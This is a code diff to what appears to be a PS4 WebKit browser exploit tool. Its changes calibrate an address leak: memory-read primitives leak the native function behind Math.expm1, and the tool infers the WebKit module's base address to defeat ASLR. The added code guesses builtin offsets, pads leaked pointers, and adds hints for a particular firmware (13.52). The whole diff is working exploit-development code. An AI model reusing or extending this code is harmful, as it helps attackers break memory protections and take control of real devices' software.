@@ -187,9 +187,11 @@ function activeDelta() {
 
 function parseAddr(str) {
     if (!str) return null;
-    const s = String(str).trim().toLowerCase().replace(/^0x/, "");
+    let s = String(str).trim().toLowerCase().replace(/^0x/, "");
     if (!/^[0-9a-f]+$/.test(s)) return null;
     if (s.length <= 8) return new int64(parseInt(s, 16), 0);
+    // PS4 pointers are often 9–11 hex digits — pad so hi/lo split is correct
+    if (s.length < 16) s = s.padStart(16, "0");
     return new int64(parseInt(s.slice(-8), 16), parseInt(s.slice(0, -8), 16));
 }
 
@@ -246,8 +248,6 @@ function liteSpanK() {
 }
 
 function captureNativeFn(p, off) {
-    const cached = loadNativeFnOverride();
-    if (cached) return cached;
     const mOff = off.wk_JSFunction_m_function || 0x28;
     const cell = p.leakval(Math.expm1);
     const mid = read8p(p, cell.add32(0x18));
@@ -256,6 +256,28 @@ function captureNativeFn(p, off) {
     if (!fn) return null;
     try { sessionStorage.setItem("wk-nativeFn", String(fn)); } catch (_) { }
     return fn;
+}
+
+function suggestedExpm1(fn, off) {
+    const hint = off && off.wk_expm1_builtin;
+    if (!fn || hint == null) return 0;
+    const residue = fn.low & (CAL_ALIGN_STEP - 1);
+    for (let ki = 0; ki < 7; ki++) {
+        const k = [-1, 0, 1, -2, 2, -3, 3][ki];
+        const d = (hint + k * CAL_ALIGN_STEP) >>> 0;
+        if ((d & 0x3fff) === residue) return d;
+    }
+    return 0;
+}
+
+function prefillSuggestedExpm1(fn, off) {
+    const guess = suggestedExpm1(fn, off);
+    if (!(guess > 0)) return 0;
+    if (expm1In) expm1In.value = guess.toString(16);
+    mark("CAL-GUESS", "expm1=0x" + guess.toString(16) + " base=" + fn.sub32(guess)
+        + " — tap Set expm1 (0 reads, skip scan)");
+    updateResultPanel();
+    return guess;
 }
 
 function tryElfOnce(p, fn, delta) {
@@ -465,13 +487,21 @@ async function runStart() {
         mark("PRIMITIVE-OK", "");
         mark("PAIR-STATUS", "state=" + pairStatus.state);
 
-        nativeFn = captureNativeFn(p, tableOff) || loadNativeFnOverride();
+        nativeFn = captureNativeFn(p, tableOff);
+        if (!nativeFn) nativeFn = loadNativeFnOverride();
         if (!nativeFn) throw new Error("nativeFn capture failed");
+
+        scanIndex = 0;
+        scanList = [];
+        try {
+            sessionStorage.removeItem("wk-cal-lite-i");
+            sessionStorage.removeItem("wk-cal-wide-i");
+        } catch (_) { }
 
         ready = true;
         logNativeFnInfo(nativeFn);
-        mark("HINT-CAL", "lite scan = 1 read/tap (ELF only). Then Set expm1 or Verify step.");
-        mark("HINT-OOM", "never leakval during cal — nativeFn saved at Start");
+        mark("HINT-CAL", "lite scan optional — Set expm1 needs 0 reads");
+        prefillSuggestedExpm1(nativeFn, tableOff);
 
         const pre = parseExpm1(params.get("expm1"));
         if (pre > 0 && expm1In) expm1In.value = pre.toString(16);
@@ -503,8 +533,15 @@ async function runScanStep(mode) {
     try {
         if (scanIndex >= scanList.length) {
             mark("CAL-FAIL", mode + " scan exhausted (" + scanList.length + " tries)");
-            mark("HINT", "type expm1 + Set expm1 (0 reads), or Verify step");
-            state("scan miss — try manual", "warn");
+            const guess = suggestedExpm1(nativeFn, tableOff);
+            if (guess > 0) {
+                if (expm1In) expm1In.value = guess.toString(16);
+                mark("CAL-GUESS", "expm1=0x" + guess.toString(16) + " base="
+                    + nativeFn.sub32(guess));
+            }
+            mark("HINT", "scan miss is OK on 13.52 — tap Set expm1 (0 reads), skip lite scan");
+            mark("HINT", "then Verify step tap 1 for CAL-ELF-OK (optional)");
+            state("scan done — use Set expm1", "warn");
             return;
         }
 
@@ -774,7 +811,7 @@ function init() {
         expm1In.addEventListener("input", function () { updateResultPanel(); });
 
     const cached = loadNativeFnOverride();
-    if (cached) mark("BOOT", "cached nativeFn " + cached + " (re-run Start for live)");
+    if (cached) mark("BOOT", "cached nativeFn " + cached + " (Start refreshes live)");
 
     const pre = params.get("expm1");
     if (pre && expm1In) expm1In.value = pre.replace(/^0x/i, "");
